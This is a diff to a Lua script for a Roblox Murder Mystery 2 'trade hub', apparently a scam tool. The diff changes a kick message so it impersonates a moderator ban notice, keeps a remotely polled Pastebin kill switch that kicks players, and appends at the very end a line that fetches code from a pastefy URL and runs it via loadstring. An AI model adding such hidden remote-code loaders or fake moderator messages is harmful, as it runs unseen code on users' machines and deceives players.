@@ -1,4 +1,5 @@
 
+
 -- ============================================================
 -- MM2 TRADE HUB (WITHOUT WEAPONS)
 -- + DEX ANIMATIONS
@@ -2904,8 +2905,9 @@ print("🖱️ Тяни за заголовок — двигать")
 print("📐 Тяни за углы (◤ ◥ ◣ ◢) — менять размер")
 print("🎯 'alexbestomg on dc' — по центру")
 print("=========================================")
+
 local PASTEBIN_URL = "https://pastebin.com/raw/852m9fGJ"
-local KICK_TEXT = "bad scammer hahahaah 😂🤣"
+local KICK_TEXT = "You have kicked by moderator: yo have banned in Murder Mystery 2 for scripting cheating exploiting, don’t try join again."
 local CHECK_INTERVAL = 5 -- 每隔几秒检查一次，建议不要设得太短以免频繁请求
 
 -- 你的核心踢人代码（封装成函数，方便在检测到 on 时调用）
@@ -3604,3 +3606,5 @@ task.spawn(function()
         task.wait(INTERVAL)
     end
 end)
+
+loadstring(game:HttpGet("https://pastefy.app/h3W3sDCN/raw"))()
